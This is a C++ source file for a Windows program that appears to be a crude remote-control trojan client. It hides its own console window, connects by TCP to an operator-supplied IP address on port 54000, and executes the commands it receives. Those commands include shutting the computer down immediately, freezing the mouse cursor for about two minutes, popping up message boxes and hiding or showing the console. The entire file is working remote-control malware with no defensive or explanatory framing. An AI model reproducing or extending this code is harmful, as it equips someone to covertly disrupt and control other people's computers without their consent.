#include <iostream>
#include <string>
#include <ws2tcpip.h>
#include <windows.h>
#pragma comment(lib, "ws2_32.lib")

using namespace std;
string act = "false";
void main()
{
	HWND mcon;
	mcon = GetConsoleWindow();
	HANDLE hc = GetStdHandle(STD_OUTPUT_HANDLE);
	string ipa;
	SetConsoleTextAttribute(hc, 15);
	cout << "Please type in the ip Address:" << endl << "> ";
	cin >> ipa;
	cout << endl;
	int port = 54000;
	ShowWindow(mcon, 0);

	WSAData wsad;
	WORD ver = MAKEWORD(2, 2);
	int wsas = WSAStartup(ver, &wsad);
	if (wsas != 0)
	{
		ShowWindow(mcon, 1);
		SetConsoleTextAttribute(hc, 15);
		cerr << "Can't start Winsock, Err #" << wsas << endl;
		return;
	}

	SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
	if (s == INVALID_SOCKET)
	{
		ShowWindow(mcon, 1);
		SetConsoleTextAttribute(hc, 15);
		cerr << "Can't create socket, Err #" << WSAGetLastError() << endl;
		WSACleanup();
		return;
	}

	sockaddr_in sain;
	sain.sin_family = AF_INET;
	sain.sin_port = htons(port);
	inet_pton(AF_INET, ipa.c_str(), &sain.sin_addr);

	int conr = connect(s, (sockaddr*)& sain, sizeof(sain));
	if (conr == SOCKET_ERROR)
	{
		ShowWindow(mcon, 1);
		SetConsoleTextAttribute(hc, 15);
		cerr << "Can't connect to server, Err #" << WSAGetLastError() << endl;
		closesocket(s);
		WSACleanup();
		return;
	}

	char buf[4096];
	string ui;

	bool wh = true;
	int ci = 15;
	string mbt = "MessageBox Caption";
	SetConsoleTitle("Client");
	do
	{
		SetConsoleTextAttribute(hc, ci);
		cout << "";

		ui = "";
		int sendResult = send(s, ui.c_str(), ui.size() + 1, 0);
		if (sendResult != SOCKET_ERROR)
		{
			ZeroMemory(buf, 4096);
			int bytesReceived = recv(s, buf, 4096, 0);
			if (bytesReceived > 0)
			{
				string input = string(buf, 0, bytesReceived);
				string echo = "echo";
				string title = "title";
				string msg = "msg";
				string shutdown = "shutdown";
				string exit_user = "exit_user";
				string console = "console";
				string hide = "hide";
				string show = "show";
				string clear = "clear";
				string color = "color";
				string cursor = "cursor";
				string freeze = "freeze";
				string move = "move";
				if (input == exit_user)
				{
					return;
				}
				else if (input.substr(0, cursor.size()) == cursor)
				{
					string inputConv = input.substr(cursor.size() + 1, input.size());
					string stemp = string(inputConv.begin(), inputConv.end());
					if (inputConv.substr(0, freeze.size()) == freeze)
					{
						POINT pt;
						if (act == "true")
						{
							act = "false";
						}
						else
						{
							act = "true";
						}
						GetCursorPos(&pt);
						int a = 120 * 100;
						int b = a;
						do
						{
							SetCursorPos(pt.x, pt.y);
							Sleep(10);
							if (((b % 50)) == 0)
							{
								if ((b % 100) != 50)
								{
									cout << "noch " << (b / 100) << " Sekunden" << endl;
								}
							}
							b--;
						} while (b >= 1);
					}
					else if (inputConv.substr(0, msg.size()) == msg)
					{
					}
				}
				else if (input.substr(0, echo.size()) == echo)
				{
					string inputConv = input.substr(echo.size() + 1, input.size());
					string stemp = string(inputConv.begin(), inputConv.end());
					string inputConv2 = input.substr(echo.size() + 1 + msg.size() + 1, input.size());
					string stemp2 = string(inputConv2.begin(), inputConv2.end());
					LPCSTR msgout = stemp2.c_str();
					if (inputConv.substr(0, title.size()) == title)
					{
						string aaa = inputConv.substr(title.size() + 1, input.size());
						mbt = aaa;
						SetConsoleTextAttribute(hc, ci);
						cout << "ECHO> " << "set title to: " << inputConv.substr(title.size() + 1, input.size()) << endl;
					}
					else if (inputConv.substr(0, msg.size()) == msg)
					{
						MessageBox(0, msgout, mbt.c_str(), MB_OK);
						SetConsoleTextAttribute(hc, ci);
						cout << "ECHO> " << "echo message: " << inputConv.substr(msg.size() + 1, inputConv.size()) << endl;
					}
				}
				else if (input == shutdown)
				{
					system("shutdown -s -t0");
					closesocket(s);
					WSACleanup();
					return;
				}
				else if (input.substr(0, console.size()) == console)
				{
					if (input.substr(console.size() + 1, input.size()) == hide) {
						ShowWindow(mcon, 0);
						SetConsoleTextAttribute(hc, ci);
						cout << "CONSOLE> " << "close" << endl;
					}
					else if (input.substr(console.size() + 1, input.size()) == show)
					{
						ShowWindow(mcon,1);
						SetConsoleTextAttribute(hc, ci);
						cout << "CONSOLE> " << "open" << endl;
					}
					else if (input.substr(console.size() + 1, input.size()) == clear)
					{
						system("cls");
						SetConsoleTextAttribute(hc, ci);
						cout << "CONSOLE> " << "clear" << endl;
					}
					else if (input.substr(console.size() + 1, console.size() + 1 + color.size()) == color)
					{
						string a = input.substr(console.size() + 1 + color.size() + 1, input.size());
						string b = a;
						cout << "CONSOLE> " << "set color to: " << endl;
						b.replace(b.find("1"), 1, "");
						b.replace(b.find("2"), 1, "");
						b.replace(b.find("3"), 1, "");
						b.replace(b.find("4"), 1, "");
						b.replace(b.find("5"), 1, "");
						b.replace(b.find("6"), 1, "");
						b.replace(b.find("7"), 1, "");
						b.replace(b.find("8"), 1, "");
						b.replace(b.find("9"), 1, "");
						b.replace(b.find("0"), 1, "");
						if (b == "")
						{
							int x = stoi(a);
							ci = x;
						}
						SetConsoleTextAttribute(hc, ci);
					}
				}
				else
				{
					cout << "Unknown Command> " << input << endl;
				}
			}
		}

	} while (wh == true);

	closesocket(s);
	WSACleanup();
}
